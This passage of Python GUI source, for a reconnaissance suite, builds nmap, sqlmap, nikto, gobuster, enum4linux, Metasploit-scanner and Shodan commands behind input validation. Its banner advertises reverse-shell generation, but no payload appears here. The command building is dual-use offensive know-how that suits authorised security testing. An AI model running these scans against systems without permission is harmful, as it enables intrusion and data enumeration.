║  ███████║╚██████╔╝██║     ███████╗██║  ██║██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║  ║
║  ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                                        ║
║                            ═══ VERSION 3.1 ═══                                         ║
║                   Professional Security Reconnaissance Suite                           ║
║                                                                                        ║
╚════════════════════════════════════════════════════════════════════════════════════════╝

  ⚠️  AUTHORIZED SECURITY TESTING ONLY - Ensure you have permission to scan

┌──────────────────────────────────────────────────────────────────────────────────────┐
│  🛠️  12 RECONNAISSANCE TOOLS                                                         │
├──────────────────────────────────────────────────────────────────────────────────────┤
│  🔍 Nmap          📁 Gobuster       🔐 Nikto         💉 SQLmap                       │
│  💥 Metasploit    🌐 Shodan         📡 DNSrecon      🖥️  enum4linux                   │
│  🔎 GitHarvester  🦀 feroxbuster    ☁️  AWS S3        📦 TCPDump                       │
└──────────────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────────────┐
│  ⚡ UTILITY FEATURES                                                                 │
├──────────────────────────────────────────────────────────────────────────────────────┤
│  🐚 Shellz (16+ Reverse Shell Types)    🔐 Encoders/Decoders (10+ Types)            │
│  📚 LOLOL (GTFOBins/LOLBAS/LOLAD)       🔄 30 Automated Workflows                   │
│  ⚙️  Configurable Settings               ❓ Comprehensive Help                       │
└──────────────────────────────────────────────────────────────────────────────────────┘

  📌 Select a tool from the sidebar → Configure your scan → Press 'RUN SCAN'

┌──────────────────────────────────────────────────────────────────────────────────────┐
│  ⌨️  KEYBOARD SHORTCUTS                                                              │
├──────────────────────────────────────────────────────────────────────────────────────┤
│  Ctrl+R: Run Scan  │  Ctrl+S: Save  │  Ctrl+L: Clear  │  Ctrl+F: Search             │
│  Ctrl+C: Copy      │  Ctrl+Q: Quit  │  ESC: Stop Scan │                             │
└──────────────────────────────────────────────────────────────────────────────────────┘

"""
        self.output_text.insert(tk.END, banner, 'info')
        self.output_text.tag_config('info', foreground=self.accent_cyan)
        # Configure additional output tags for Monokai syntax highlighting
        self.output_text.tag_config('success', foreground=self.accent_green)    # Monokai green
        self.output_text.tag_config('error', foreground=self.accent_red)        # Monokai pink/red
        self.output_text.tag_config('warning', foreground=self.accent_orange)   # Monokai orange
        self.output_text.tag_config('highlight', background=self.bg_tertiary, foreground=self.accent_yellow)
        self.output_text.tag_config('keyword', foreground=self.accent_red)      # Monokai keywords
        self.output_text.tag_config('string', foreground=self.accent_yellow)    # Monokai strings
        self.output_text.tag_config('number', foreground=self.accent_purple)    # Monokai numbers
        self.output_text.tag_config('comment', foreground=self.text_muted)      # Monokai comments
        self.output_text.tag_config('function', foreground=self.accent_green)   # Monokai functions
        # Initialize line count for banner
        self.output_line_count = banner.count('\n')

    def copy_selection(self):
        """Copy selected text or all output to clipboard."""
        try:
            # Try to get selected text first
            selected_text = self.output_text.get(tk.SEL_FIRST, tk.SEL_LAST)
            if selected_text:
                self.root.clipboard_clear()
                self.root.clipboard_append(selected_text)
                self.update_status("Selection copied to clipboard", self.accent_green)
                return
        except tk.TclError:
            # No selection, copy all
            pass

        # Copy all text if no selection
        all_text = self.output_text.get(1.0, tk.END)
        if all_text.strip():
            self.root.clipboard_clear()
            self.root.clipboard_append(all_text)
            self.update_status("All output copied to clipboard", self.accent_green)
        else:
            self.update_status("No text to copy", self.accent_red)

    def show_search_dialog(self):
        """Show search dialog for finding text in output."""
        search_window = tk.Toplevel(self.root)
        search_window.title("Search Output")
        search_window.geometry("400x150")
        search_window.configure(bg=self.bg_secondary)
        search_window.transient(self.root)
        search_window.grab_set()

        # Search label and entry
        tk.Label(search_window, text="Search for:", font=("Courier", 10),
                fg=self.text_color, bg=self.bg_secondary).pack(pady=10)

        search_entry = tk.Entry(search_window, font=("Courier", 12),
                               bg=self.bg_primary, fg=self.accent_cyan,
                               insertbackground=self.accent_cyan, width=40)
        search_entry.pack(pady=5)
        search_entry.focus()

        result_label = tk.Label(search_window, text="", font=("Courier", 9),
                               fg=self.accent_green, bg=self.bg_secondary)
        result_label.pack(pady=5)

        def perform_search(event=None):
            # Remove previous highlights
            self.output_text.tag_remove('highlight', '1.0', tk.END)

            search_term = search_entry.get()
            if not search_term:
                result_label.config(text="Enter search term", fg=self.accent_red)
                return

            # Search and highlight
            start_pos = '1.0'
            count = 0
            while True:
                pos = self.output_text.search(search_term, start_pos, tk.END, nocase=True)
                if not pos:
                    break
                end_pos = f"{pos}+{len(search_term)}c"
                self.output_text.tag_add('highlight', pos, end_pos)
                count += 1
                start_pos = end_pos

            if count > 0:
                result_label.config(text=f"Found {count} occurrence(s)", fg=self.accent_green)
                # Scroll to first occurrence
                first_pos = self.output_text.search(search_term, '1.0', tk.END, nocase=True)
                if first_pos:
                    self.output_text.see(first_pos)
            else:
                result_label.config(text="No matches found", fg=self.accent_red)

        search_entry.bind('<Return>', perform_search)

        # Buttons
        button_frame = tk.Frame(search_window, bg=self.bg_secondary)
        button_frame.pack(pady=10)

        tk.Button(button_frame, text="Search", command=perform_search,
                 bg=self.accent_green, fg=self.bg_primary, font=("Courier", 10, "bold"),
                 cursor="hand2", padx=20).pack(side=tk.LEFT, padx=5)

        tk.Button(button_frame, text="Close", command=search_window.destroy,
                 bg=self.bg_primary, fg=self.text_color, font=("Courier", 10, "bold"),
                 cursor="hand2", padx=20).pack(side=tk.LEFT, padx=5)

    def show_export_menu(self):
        """Show export format selection menu."""
        export_menu = tk.Menu(self.root, tearoff=0, bg=self.bg_secondary,
                             fg=self.text_color, font=("Courier", 10))
        export_menu.add_command(label="Export as Text (.txt)", command=self.save_output)
        export_menu.add_command(label="Export as JSON (.json)", command=self.export_to_json)
        export_menu.add_command(label="Export as XML (.xml)", command=self.export_to_xml)
        export_menu.add_command(label="Export as HTML (.html)", command=self.export_to_html)

        try:
            export_menu.tk_popup(self.root.winfo_pointerx(), self.root.winfo_pointery())
        finally:
            export_menu.grab_release()

    def export_to_json(self):
        """Export scan results to JSON format."""
        content = self.output_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showwarning("Warning", "No output to export")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            initialfile=f"recon_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )

        if filename:
            try:
                abs_path = os.path.abspath(filename)
                home_dir = os.path.expanduser("~")

                if not abs_path.startswith(home_dir):
                    messagebox.showerror("Security Error",
                        "Cannot write files outside your home directory for security reasons.")
                    return

                # Parse output into structured JSON
                export_data = {
                    "timestamp": datetime.now().isoformat(),
                    "tool": self.current_tool or "unknown",
                    "output": content,
                    "lines": content.count('\n')
                }

                with open(abs_path, 'w') as f:
                    json.dump(export_data, f, indent=2)

                messagebox.showinfo("Exported", f"Output exported to:\n{abs_path}")
                self.update_status("Exported to JSON", self.accent_green)
            except (OSError, IOError) as e:
                messagebox.showerror("Error", f"Failed to export: {str(e)}")

    def export_to_xml(self):
        """Export scan results to XML format."""
        content = self.output_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showwarning("Warning", "No output to export")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".xml",
            filetypes=[("XML files", "*.xml"), ("All files", "*.*")],
            initialfile=f"recon_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        )

        if filename:
            try:
                abs_path = os.path.abspath(filename)
                home_dir = os.path.expanduser("~")

                if not abs_path.startswith(home_dir):
                    messagebox.showerror("Security Error",
                        "Cannot write files outside your home directory for security reasons.")
                    return

                # Create simple XML structure
                import xml.etree.ElementTree as ET
                root = ET.Element("ReconOutput")
                ET.SubElement(root, "Timestamp").text = datetime.now().isoformat()
                ET.SubElement(root, "Tool").text = self.current_tool or "unknown"
                ET.SubElement(root, "Output").text = content

                tree = ET.ElementTree(root)
                tree.write(abs_path, encoding='utf-8', xml_declaration=True)

                messagebox.showinfo("Exported", f"Output exported to:\n{abs_path}")
                self.update_status("Exported to XML", self.accent_green)
            except (OSError, IOError) as e:
                messagebox.showerror("Error", f"Failed to export: {str(e)}")

    def export_to_html(self):
        """Export scan results to HTML format with styling."""
        content = self.output_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showwarning("Warning", "No output to export")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML files", "*.html"), ("All files", "*.*")],
            initialfile=f"recon_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        )

        if filename:
            try:
                abs_path = os.path.abspath(filename)
                home_dir = os.path.expanduser("~")

                if not abs_path.startswith(home_dir):
                    messagebox.showerror("Security Error",
                        "Cannot write files outside your home directory for security reasons.")
                    return

                # Create HTML with dark theme styling
                html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Recon Superpower Output - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</title>
    <style>
        body {{
            background-color: #0a0e27;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }}
        h1 {{
            color: #00d9ff;
            border-bottom: 2px solid #00ff41;
            padding-bottom: 10px;
        }}
        pre {{
            background-color: #151b3d;
            padding: 15px;
            border-radius: 5px;
            border-left: 3px solid #00ff41;
            overflow-x: auto;
        }}
        .timestamp {{
            color: #00d9ff;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <h1>⚡ Recon Superpower Output</h1>
    <p class="timestamp">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p class="timestamp">Tool: {self.current_tool.upper() if self.current_tool else 'UNKNOWN'}</p>
    <pre>{content}</pre>
</body>
</html>"""

                with open(abs_path, 'w') as f:
                    f.write(html_content)

                messagebox.showinfo("Exported", f"Output exported to:\n{abs_path}")
                self.update_status("Exported to HTML", self.accent_green)
            except (OSError, IOError) as e:
                messagebox.showerror("Error", f"Failed to export: {str(e)}")

    def append_output(self, text, tag='normal'):
        # Security: Limit output size to prevent memory exhaustion
        lines_to_add = text.count('\n')
        self.output_line_count += lines_to_add

        # If exceeding limit, remove old lines from top
        if self.output_line_count > self.max_output_lines:
            lines_to_remove = self.output_line_count - self.max_output_lines
            self.output_text.delete('1.0', f'{lines_to_remove + 1}.0')
            self.output_line_count = self.max_output_lines

        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)
        self.output_text.update()

    def clear_output(self):
        self.output_text.delete(1.0, tk.END)
        self.output_line_count = 0
        self.print_banner()

    def save_output(self):
        content = self.output_text.get(1.0, tk.END)
        if content.strip():
            filename = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
                initialfile=f"recon_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            )
            if filename:
                # Security: Validate output path stays within safe directory
                try:
                    abs_path = os.path.abspath(filename)
                    home_dir = os.path.expanduser("~")

                    # Ensure write location is within user's home directory
                    if not abs_path.startswith(home_dir):
                        messagebox.showerror("Security Error",
                            "Cannot write files outside your home directory for security reasons.")
                        return

                    # Write file with proper error handling
                    with open(abs_path, 'w') as f:
                        f.write(content)
                    messagebox.showinfo("Saved", f"Output saved to:\n{abs_path}")
                except (OSError, IOError) as e:
                    messagebox.showerror("Error", f"Failed to save file: {str(e)}")

    def show_cheatsheet(self, tool_id):
        """Display cheat sheet for the specified tool in a popup window."""
        if tool_id not in self.tool_cheatsheets:
            messagebox.showinfo("Info", f"No cheat sheet available for {tool_id}")
            return
        
        # Create popup window
        popup = tk.Toplevel(self.root)
        popup.title(f"{tool_id.upper()} Cheat Sheet")
        popup.geometry("800x600")
        popup.configure(bg=self.bg_primary)
        
        # Make window modal
        popup.transient(self.root)
        popup.grab_set()
        
        # Title
        title_label = tk.Label(
            popup,
            text=f"📋 {tool_id.upper()} CHEAT SHEET",
            font=("Courier", 16, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_primary
        )
        title_label.pack(pady=10)
        
        # Text widget with scrollbar
        text_frame = tk.Frame(popup, bg=self.bg_secondary)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
        
        scrollbar = tk.Scrollbar(text_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        text_widget = tk.Text(
            text_frame,
            font=("Courier", 10),
            bg=self.bg_secondary,
            fg=self.text_color,
            wrap=tk.WORD,
            yscrollcommand=scrollbar.set,
            padx=10,
            pady=10
        )
        text_widget.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=text_widget.yview)
        
        # Insert cheat sheet content
        text_widget.insert('1.0', self.tool_cheatsheets[tool_id])
        text_widget.config(state=tk.DISABLED)  # Make read-only
        
        # Close button
        close_btn = tk.Button(
            popup,
            text="✖ CLOSE",
            font=("Courier", 10, "bold"),
            bg=self.bg_tertiary,
            fg=self.text_color,
            activebackground=self.accent_red,
            activeforeground="white",
            relief=tk.FLAT,
            padx=20,
            pady=8,
            cursor="hand2",
            command=popup.destroy
        )
        close_btn.pack(pady=(0, 15))
    
    def update_status(self, message, color=None):
        if color is None:
            color = self.accent_green
        self.status_label.config(text=f"[ {message} ]", fg=color)

    def build_command(self):
        # Use current tool instead of tab index
        tool_id = self.current_tool
        
        # Settings tab doesn't build commands
        if tool_id == "settings":
            messagebox.showinfo("Info", "This is the settings tab. Select a tool to run scans.")
            return None

        if tool_id == "nmap":
            target = self.nmap_target.get().strip()
            if not target:
                messagebox.showerror("Error", "Please enter a target")
                return None

            # Security: Validate target to prevent command injection
            if not self.validate_target(target):
                messagebox.showerror("Security Error",
                    "Invalid target format. Target contains dangerous characters or invalid format.")
                return None

            scan_type_raw = self.nmap_scan_type.get().strip()
            scan_type = scan_type_raw.split()[0] if scan_type_raw else "-sT"
            timing_raw = self.nmap_timing.get().strip()
            timing = timing_raw.split()[0] if timing_raw else "T3"
            ports = self.nmap_ports.get().strip()
            extra = self.nmap_options.get().strip()

            # Security: Validate port range
            if ports and not re.match(r'^[\d,\-]+$', ports):
                messagebox.showerror("Error", "Invalid port format. Use format like: 80,443 or 1-1000")
                return None

            cmd = ["nmap", scan_type, timing]
            if ports:
                cmd.extend(["-p", ports])

            # NSE Scripts support (NEW FEATURE)
            script_selection = self.nmap_scripts.get()
            if script_selection and not script_selection.startswith("(none)"):
                if script_selection.startswith("Custom"):
                    # Use custom script from custom script field
                    custom_script = self.nmap_custom_script.get().strip()
                    if custom_script:
                        # Validate script name (allow alphanumeric, hyphens, commas, underscores)
                        if re.match(r'^[a-zA-Z0-9,\\-_]+$', custom_script):
                            cmd.extend(["--script", custom_script])
                        else:
                            messagebox.showerror("Error", "Invalid script name. Use alphanumeric characters, hyphens, and commas only.")
                            return None
                else:
                    # Use predefined script category
                    script_name = script_selection.split()[0]  # Extract the script name before any description
                    cmd.extend(["--script", script_name])

            # Security: Validate and parse extra options
            if extra:
                valid, parsed_options = self.validate_extra_options(extra)
                if not valid:
                    messagebox.showerror("Security Error",
                        "Extra options contain dangerous characters or invalid syntax.\n"
                        "Avoid using: ; & | $ ` < > and command substitution.")
                    return None
                cmd.extend(parsed_options)

            cmd.append(target)

            return cmd

        elif tool_id == "gobuster":
            url = self.gobuster_url.get().strip()
            if not url:
                messagebox.showerror("Error", "Please enter a target URL")
                return None

            # Security: Validate URL to prevent injection
            if not self.validate_url(url):
                messagebox.showerror("Security Error",
                    "Invalid URL format or dangerous characters detected.\n"
                    "URL must start with http:// or https://")
                return None

            wordlist = self.gobuster_wordlist.get().strip()
            if not wordlist or not os.path.isfile(wordlist):
                messagebox.showerror("Error", "Please select a valid wordlist file")
                return None

            # Security: Validate wordlist path
            if not self.validate_file_path(wordlist):
                messagebox.showerror("Security Error",
                    "Invalid wordlist path. Path contains suspicious patterns.")
                return None

            mode_raw = self.gobuster_mode.get().strip()
            mode = mode_raw.split()[0] if mode_raw else "dir"
            threads = self.gobuster_threads.get().strip()
            extensions = self.gobuster_extensions.get().strip()
            extra = self.gobuster_options.get().strip()

            # Security: Validate thread count
            if threads and not self.validate_numeric(threads, 1, 1000):
                messagebox.showerror("Error", "Thread count must be between 1 and 1000")
                return None

            # Security: Validate extensions format
            if extensions and not re.match(r'^[a-zA-Z0-9,]+$', extensions):
                messagebox.showerror("Error", "Invalid extensions format. Use format like: php,html,txt")
                return None

            cmd = ["gobuster", mode, "-u", url, "-w", wordlist]
            if threads:
                cmd.extend(["-t", threads])
            if extensions and mode == "dir":
                cmd.extend(["-x", extensions])

            # Security: Validate and parse extra options
            if extra:
                valid, parsed_options = self.validate_extra_options(extra)
                if not valid:
                    messagebox.showerror("Security Error",
                        "Extra options contain dangerous characters or invalid syntax.\n"
                        "Avoid using: ; & | $ ` < > and command substitution.")
                    return None
                cmd.extend(parsed_options)

            return cmd

        elif tool_id == "nikto":
            target = self.nikto_target.get().strip()
            if not target:
                messagebox.showerror("Error", "Please enter a target")
                return None

            # Security: Validate target (can be URL or hostname)
            # If it looks like a URL, validate as URL, otherwise as target
            if target.startswith('http://') or target.startswith('https://'):
                if not self.validate_url(target):
                    messagebox.showerror("Security Error",
                        "Invalid URL format or dangerous characters detected.")
                    return None
            else:
                if not self.validate_target(target):
                    messagebox.showerror("Security Error",
                        "Invalid target format. Target contains dangerous characters.")
                    return None

            port = self.nikto_port.get().strip()
            tuning_raw = self.nikto_tuning.get().strip()
            tuning = tuning_raw.split()[0] if tuning_raw else "x"
            extra = self.nikto_options.get().strip()

            # Security: Validate port number
            if not self.validate_port(port):
                messagebox.showerror("Error", "Invalid port number. Must be between 1 and 65535")
                return None

            # Security: Validate tuning parameter (must be single char or digit)
            if tuning and not re.match(r'^[0-9x]$', tuning):
                messagebox.showerror("Error", "Invalid tuning option")
                return None

            cmd = ["nikto", "-h", target]
            if port:
                cmd.extend(["-p", port])
            if self.nikto_ssl_var.get():
                cmd.append("-ssl")
            if tuning:
                cmd.extend(["-Tuning", tuning])

            # Security: Validate and parse extra options
            if extra:
                valid, parsed_options = self.validate_extra_options(extra)
                if not valid:
                    messagebox.showerror("Security Error",
                        "Extra options contain dangerous characters or invalid syntax.\n"
                        "Avoid using: ; & | $ ` < > and command substitution.")
                    return None
                cmd.extend(parsed_options)

            return cmd

        elif tool_id == "sqlmap":
            url = self.sqlmap_url.get().strip()
            if not url:
                messagebox.showerror("Error", "Please enter a target URL")
                return None

            # Security: Validate URL format
            if not self.validate_url(url):
                messagebox.showerror("Security Error",
                    "Invalid URL format or dangerous characters detected.\n"
                    "URL must start with http:// or https://")
                return None

            # Get options
            level_raw = self.sqlmap_level.get().strip()
            level = level_raw.split()[0] if level_raw else "1"
            risk_raw = self.sqlmap_risk.get().strip()
            risk = risk_raw.split()[0] if risk_raw else "1"
            technique_raw = self.sqlmap_technique.get().strip()
            technique = technique_raw.split()[0] if technique_raw else "BEUSTQ"
            threads = self.sqlmap_threads.get().strip()
            tamper = self.sqlmap_tamper.get()
            post_data = self.sqlmap_data.get().strip()
            cookie = self.sqlmap_cookie.get().strip()
            extra = self.sqlmap_options.get().strip()

            # Security: Validate level (1-5)
            if not self.validate_numeric(level, 1, 5):
                messagebox.showerror("Error", "Level must be between 1 and 5")
                return None

            # Security: Validate risk (1-3)
            if not self.validate_numeric(risk, 1, 3):
                messagebox.showerror("Error", "Risk must be between 1 and 3")
                return None

            # Security: Validate threads (1-10)
            if threads and not self.validate_numeric(threads, 1, 10):
                messagebox.showerror("Error", "Thread count must be between 1 and 10")
                return None

            # Security: Validate technique (must be valid SQLmap technique chars)
            if technique and not re.match(r'^[BEUSTQ]+$', technique):
                messagebox.showerror("Error", "Invalid technique. Use: B, E, U, S, T, Q or combination")
                return None

            # Security: Validate POST data (no shell metacharacters)
            if post_data and not re.match(r'^[a-zA-Z0-9_=&\-\.\%\+]+$', post_data):
                messagebox.showerror("Security Error",
                    "POST data contains invalid characters.\n"
                    "Use only alphanumeric characters and standard URL encoding.")
                return None

            # Security: Validate cookie (no shell metacharacters)
            if cookie and not re.match(r'^[a-zA-Z0-9_=;\-\.\%\+\s]+$', cookie):
                messagebox.showerror("Security Error",
                    "Cookie contains invalid characters.\n"
                    "Use only alphanumeric characters and standard cookie format.")
                return None

            # Security: Validate tamper script name
            if tamper and tamper != "(None)" and not re.match(r'^[a-zA-Z0-9_,]+$', tamper):
                messagebox.showerror("Error", "Invalid tamper script name")
                return None

            # Build command
            cmd = ["sqlmap", "-u", url]

            # Add level and risk
            cmd.extend(["--level", level])
            cmd.extend(["--risk", risk])

            # Add technique if not all
            if technique != "BEUSTQ":
                cmd.extend(["--technique", technique])

            # Add threads
            if threads:
                cmd.extend(["--threads", threads])

            # Add batch mode
            if self.sqlmap_batch_var.get():
                cmd.append("--batch")

            # Add forms detection
            if self.sqlmap_forms_var.get():
                cmd.append("--forms")

            # Add random agent
            if self.sqlmap_random_agent_var.get():
                cmd.append("--random-agent")

            # Add database enumeration
            if self.sqlmap_dbs_var.get():
                cmd.append("--dbs")

            # Add tables enumeration
            if self.sqlmap_tables_var.get():
                cmd.append("--tables")

            # Add banner
            if self.sqlmap_banner_var.get():
                cmd.append("--banner")

            # Add POST data
            if post_data:
                cmd.extend(["--data", post_data])

            # Add cookie
            if cookie:
                cmd.extend(["--cookie", cookie])

            # Add tamper script
            if tamper and tamper != "(None)":
                cmd.extend(["--tamper", tamper])

            # Security: Validate and parse extra options
            if extra:
                valid, parsed_options = self.validate_extra_options(extra)
                if not valid:
                    messagebox.showerror("Security Error",
                        "Extra options contain dangerous characters or invalid syntax.\n"
                        "Avoid using: ; & | $ ` < > and command substitution.")
                    return None
                cmd.extend(parsed_options)

            return cmd

        elif tool_id == "metasploit":
            module = self.msf_module.get().strip()
            target = self.msf_target.get().strip()

            if not module:
                messagebox.showerror("Error", "Please select a module")
                return None

            if not target:
                messagebox.showerror("Error", "Please enter a target (RHOSTS)")
                return None

            # Security: Validate module path (must be auxiliary/scanner)
            if not module.startswith("auxiliary/scanner/"):
                messagebox.showerror("Security Error",
                    "Only auxiliary/scanner modules are allowed for reconnaissance.\n"
                    "Exploitation modules are not permitted.")
                return None

            # Security: Validate module path format
            if not re.match(r'^auxiliary/scanner/[a-z_/]+$', module):
                messagebox.showerror("Security Error",
                    "Invalid module path format.")
                return None

            # Security: Validate target
            if not self.validate_target(target):
                messagebox.showerror("Security Error",
                    "Invalid target format. Target contains dangerous characters.")
                return None

            ports = self.msf_ports.get().strip()
            threads = self.msf_threads.get().strip()
            extra = self.msf_options.get().strip()

            # Security: Validate ports if specified
            if ports and not re.match(r'^[\d,\-]+$', ports):
                messagebox.showerror("Error", "Invalid port format. Use format like: 80,443 or 1-1000")
                return None

            # Security: Validate thread count
            if threads and not self.validate_numeric(threads, 1, 100):
                messagebox.showerror("Error", "Thread count must be between 1 and 100")
                return None

            # Build msfconsole command with resource file
            # Using -q for quiet mode, -x for execute command
            cmd = ["msfconsole", "-q", "-x"]

            # Build the MSF commands
            msf_commands = f"use {module}; "
            msf_commands += f"set RHOSTS {target}; "

            if ports and "portscan" in module:
                msf_commands += f"set PORTS {ports}; "

            if threads:
                msf_commands += f"set THREADS {threads}; "

            # Security: Validate and parse extra options
            if extra:
                valid, parsed_options = self.validate_extra_options(extra)
                if not valid:
                    messagebox.showerror("Security Error",
                        "Extra options contain dangerous characters or invalid syntax.\n"
                        "Avoid using: ; & | $ ` < > and command substitution.")
                    return None
                # Add each option as a set command
                for option in parsed_options:
                    if '=' in option:
                        msf_commands += f"set {option}; "

            msf_commands += "run; exit"

            cmd.append(msf_commands)

            return cmd

        elif tool_id == "shodan":
            # Check API key
            api_key = self.config.get("shodan_api_key")
            if not api_key:
                messagebox.showerror("Error", "Please configure your Shodan API key in Settings first.")
                return None

            query = self.shodan_query.get().strip()
            if not query:
                messagebox.showerror("Error", "Please enter a search query")
                return None

            # Security: Validate query length
            if len(query) > 500:
                messagebox.showerror("Error", "Search query too long (max 500 characters)")
                return None

            search_type_raw = self.shodan_type.get().strip()
            # Handle new format "search - General query search" or old "search (Query search)"
            search_type = search_type_raw.split()[0] if search_type_raw else "search"
            facets = self.shodan_facets.get().strip() if hasattr(self.shodan_facets, 'get') else ""
            limit = self.shodan_limit.get().strip() if hasattr(self.shodan_limit, 'get') else "100"

            # SECURITY FIX (HIGH-3): Prevent SSRF - block private IPs for host lookups
            if search_type == "host":
                # Extract IP/hostname from query
                ip_pattern = r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$'
                match = re.match(ip_pattern, query)
                if match:
                    ip_parts = [int(x) for x in match.group(1).split('.')]
                    # Block private IP ranges
                    if (ip_parts[0] == 10 or  # 10.0.0.0/8
                        (ip_parts[0] == 172 and 16 <= ip_parts[1] <= 31) or  # 172.16.0.0/12
                        (ip_parts[0] == 192 and ip_parts[1] == 168) or  # 192.168.0.0/16
                        ip_parts[0] == 127):  # 127.0.0.0/8 (localhost)
                        messagebox.showerror("Security Error",
                            "Cannot query private IP ranges via Shodan.\nPrivate IPs (10.x, 172.16-31.x, 192.168.x, 127.x) are blocked.")
                        return None

            # SECURITY FIX (CRIT-1): Use environment variable for API key to prevent exposure
            # Set key as environment variable instead of command line argument
            import os
            os.environ['SHODAN_API_KEY'] = api_key
            cmd = ["shodan", search_type, query]
            
            if facets and search_type == "search":
                cmd.extend(["--facets", facets])
            
            if limit and search_type == "search":
                cmd.extend(["--limit", limit])

            # Note: shodan CLI reads SHODAN_API_KEY from environment automatically
            return cmd

        elif tool_id == "dnsrecon":
            domain = self.dnsrecon_domain.get().strip()
            if not domain:
                messagebox.showerror("Error", "Please enter a domain")
                return None

            # SECURITY FIX (HIGH-4): Improved domain validation
            # Check basic format
            if not re.match(r'^[a-zA-Z0-9\.\-]+$', domain):
                messagebox.showerror("Error", "Invalid domain format - use only alphanumeric, dots, and hyphens")
                return None
            
            # Prevent excessive length
            if len(domain) > 253:
                messagebox.showerror("Error", "Domain name too long (max 253 characters)")
                return None
            
            # Prevent consecutive dots
            if '..' in domain:
                messagebox.showerror("Error", "Invalid domain - consecutive dots not allowed")
                return None
            
            # Prevent leading/trailing dots or hyphens
            if domain.startswith(('.', '-')) or domain.endswith(('.', '-')):
                messagebox.showerror("Error", "Invalid domain - cannot start/end with dot or hyphen")
                return None
            
            # Validate each label (part between dots)
            labels = domain.split('.')
            for label in labels:
                if len(label) == 0 or len(label) > 63:
                    messagebox.showerror("Error", "Invalid domain label length (each part must be 1-63 chars)")
                    return None

            scan_type_raw = self.dnsrecon_type.get().strip()
            scan_type = scan_type_raw.split()[0] if scan_type_raw else "std"
            wordlist = self.dnsrecon_wordlist.get().strip()
            nameserver = self.dnsrecon_ns.get().strip()

            cmd = ["dnsrecon", "-d", domain, "-t", scan_type]

            if wordlist and scan_type == "brt":
                # Validate path BEFORE checking existence (HIGH-2 fix)
                if not self.validate_file_path(wordlist):
                    messagebox.showerror("Error", "Invalid wordlist path")
                    return None
                if not os.path.isfile(wordlist):
                    messagebox.showerror("Error", "Wordlist file not found")
                    return None
                cmd.extend(["-D", wordlist])

            if nameserver:
                if not self.validate_target(nameserver):
                    messagebox.showerror("Error", "Invalid nameserver")
                    return None
                cmd.extend(["-n", nameserver])

            return cmd

        elif tool_id == "enum4linux":
            target = self.enum4linux_target.get().strip()
            if not target:
                messagebox.showerror("Error", "Please enter a target IP")
                return None

            if not self.validate_target(target):
                messagebox.showerror("Error", "Invalid target IP format")
                return None

            cmd = ["enum4linux"]

            if self.enum4linux_all_var.get():
                cmd.append("-a")
            else:
                if self.enum4linux_users_var.get():
                    cmd.append("-U")
                if self.enum4linux_shares_var.get():
                    cmd.append("-S")
                if self.enum4linux_groups_var.get():
                    cmd.append("-G")
                if self.enum4linux_pass_var.get():
                    cmd.append("-P")

            username = self.enum4linux_user.get().strip()
            password = self.enum4linux_pass.get().strip()

            if username:
                cmd.extend(["-u", username])
            if password:
                cmd.extend(["-p", password])

            cmd.append(target)

            return cmd

        elif tool_id == "githarvester":
            search = self.githarvester_search.get().strip()
            if not search:
                messagebox.showerror("Error", "Please enter a GitHub search query")
                return None

            # Security: Limit query length
            if len(search) > 500:
                messagebox.showerror("Error", "Search query too long (max 500 characters)")
                return None

            # Note: GitHarvester needs to be installed separately
            # Assuming it's a Python script at a known location
            cmd = ["python3", "githarvester.py"]

            cmd.extend(["-s", search])

            regex = self.githarvester_regex.get().strip()
            if regex:
                # SECURITY FIX (CRIT-2): Validate regex to prevent ReDoS
                # Limit regex length
                if len(regex) > 200:
                    messagebox.showerror("Error", "Regex pattern too long (max 200 characters)")
                    return None
                
                # Test regex compilation and complexity
                try:
                    import re as re_module
                    # Try to compile the regex
                    compiled = re_module.compile(regex)
                    
                    # Test for catastrophic backtracking with a timeout
                    # (Python doesn't have native regex timeout, so we use simple checks)
                    # Block obviously dangerous patterns
                    dangerous_patterns = [
                        r'(a+)+',      # Nested quantifiers
                        r'(a*)*',      # Nested zero-or-more
                        r'(a|a)*',     # Alternation repetition
                        r'(.*)*',      # Greedy nested
                    ]
                    for dangerous in dangerous_patterns:
                        if dangerous in regex:
                            messagebox.showerror("Security Error",
                                "Regex pattern contains potentially dangerous nested quantifiers.\n"
                                "Please simplify your pattern to avoid catastrophic backtracking.")
                            return None
                except re_module.error as e:
                    messagebox.showerror("Error", f"Invalid regex pattern: {str(e)}")
                    return None
                
                cmd.extend(["-r", regex])

            account = self.githarvester_account.get().strip()
            if account:
                # FIX HIGH-4: Validate GitHub username format
                if not self.validate_github_account(account):
                    messagebox.showerror("Error", "Invalid GitHub username/organization format")
                    return None
                if len(account) > 100:
                    messagebox.showerror("Error", "Account name too long")
                    return None
                cmd.extend(["-a", account])

            project = self.githarvester_project.get().strip()
            if project:
                if len(project) > 100:
